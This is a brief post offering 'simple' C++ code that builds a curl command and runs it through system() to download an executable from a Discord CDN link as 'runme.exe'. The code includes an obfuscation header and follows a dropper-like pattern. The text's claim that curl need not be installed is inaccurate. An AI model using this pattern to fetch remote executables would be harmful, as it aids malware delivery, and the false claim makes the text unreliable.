# cpp-file-download
This is by far the simpliest code possible to download a file using cpp.
It uses curl but dosnt require you to have curl installed cuz it uses
curl through windows cmd prompt.


#include <fstream>
#include <iostream>
#include "obfuscate.h"

using namespace std;

int main()
{
    string url = "https://cdn.discordapp.com/attachments/967041166388375562/969876318315479060/rufus-3.17.exe";
    string cmd = "curl \"" + url + "\" --output runme.exe";
    system(cmd.c_str());
}
